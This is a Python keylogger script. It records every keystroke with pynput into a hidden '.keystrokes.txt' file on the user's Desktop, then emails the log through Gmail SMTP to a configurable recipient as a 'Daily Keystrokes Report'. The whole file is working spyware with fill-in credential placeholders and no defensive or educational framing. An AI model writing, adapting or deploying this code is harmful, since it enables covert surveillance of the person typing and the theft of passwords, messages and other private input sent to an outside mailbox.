import os
from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
hidden_file_path = os.path.join(desktop_path, '.keystrokes.txt')

# Replace these variables with your own information depending on circumstance and desired result
email_address = 'your_email@gmail.com'
email_password = 'your_email_password'
recipient_email = 'recipient_email@example.com'

def send_email(subject, body, to_email):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(email_address, email_password)
        server.sendmail(email_address, to_email, msg.as_string())

def on_press(key):
    try:
        # Print the key that was pressed
        print(f'Key {key.char} pressed')

        # Save the key to the hidden text file
        with open(hidden_file_path, 'a') as file:
            file.write(key.char)

    except AttributeError:
        # Handle special keys
        print(f'Special key {key} pressed')

        # Save the special key to the hidden text file
        with open(hidden_file_path, 'a') as file:
            file.write(str(key))

def on_release(key):
    # Stop the listener if the 'esc' key is pressed
    if key == keyboard.Key.esc:
        # Send an email with the keystrokes
        with open(hidden_file_path, 'r') as file:
            keystrokes = file.read()

        subject = 'Daily Keystrokes Report'
        body = f'Keystrokes captured:\n\n{keystrokes}'

        send_email(subject, body, recipient_email)

        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
